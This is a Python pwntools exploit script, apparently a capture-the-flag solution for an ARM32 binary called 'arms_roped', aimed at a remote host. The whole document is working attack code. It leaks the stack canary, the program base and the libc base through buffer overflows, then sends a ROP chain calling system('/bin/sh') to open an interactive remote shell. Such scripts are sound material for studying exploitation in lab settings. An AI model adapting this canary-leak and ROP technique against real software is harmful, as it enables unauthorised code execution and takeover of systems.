#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("./arms_roped")
libc = ELF("./libc.so.6")
# libc = ELF("./libc-2.31.so")      # For docker (it doesn't work)

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("83.136.252.32", 40455)

    return r


def leak_canary() -> int:
    r.sendline(b"A" * 33)   # Overwrites the canary's '\x00' so it will be leaked with `puts()`
    output = re.match(rb"A{33}(.+)", r.recvline()).group(1)

    return int.from_bytes(b"\x00" + output, "little")


def leak_bin_addr() -> int:
    r.sendline(b"A" * 48)
    output = re.match(rb"A{48}(.{4})", r.recvline()).group(1)
    output = int.from_bytes(output, "little") - (exe.symbols["main"] + 108)

    return output


# NOTE: Since i couldn't debug properly and the libc was different from the remote one, the process of
#       obtaining the correct offset for `__libc_start_main` was done by observing the difference between
#       the address leaked and the one that i had by subtracting `__libc_start_main`s address
#       (yep, it sucks but that was my only approach left and, luckly, it worked)
def leak_libc_addr() -> int:
    r.sendline(b"A" * 72)
    output = re.match(rb"A{72}(.{4})", r.recvline()).group(1)
    output = int.from_bytes(output, "little") - (libc.symbols["__libc_start_main"] + 152)
 
    return output


def spawn_shell(canary: int):
    # Taken from ropper (the green address is the correct one)
    pop_r0_r1_pc = libc.address + 0x06ed9b
    pop_pc       = libc.address + 0x072abb

    payload = flat(
                    b"quit" + (b"A" * 28),          # "quit" to trigger the chain and call `system()`
                    p32(canary),
                    p32(0) * 3,                     # Padding for something in between (i don't know what it is, probably registers)
                    p32(pop_r0_r1_pc),              # Pop into r0 the address of "/bin/sh" (see syscall table for ARM32)
                    p32(next(libc.search(b"/bin/sh\x00"))),
                    p32(0x41414141),
                    p32(pop_pc),                    # Dummy return address
                    p32(libc.symbols["system"])     # le GOAT
                  )

    r.sendline(payload)
    r.interactive("$ ")


# NOTE: Binary's architecture is ARM32
def main():
    r = conn()

    canary = leak_canary()
    log.info(f"Canary : 0x{canary:x}")

    exe.address = leak_bin_addr()
    log.info(f"Program Base Address : 0x{exe.address:x}")

    libc.address = leak_libc_addr()
    log.info(f"LIBC Base Address : 0x{libc.address:x}")

    spawn_shell(canary)


if __name__ == "__main__":
    main()
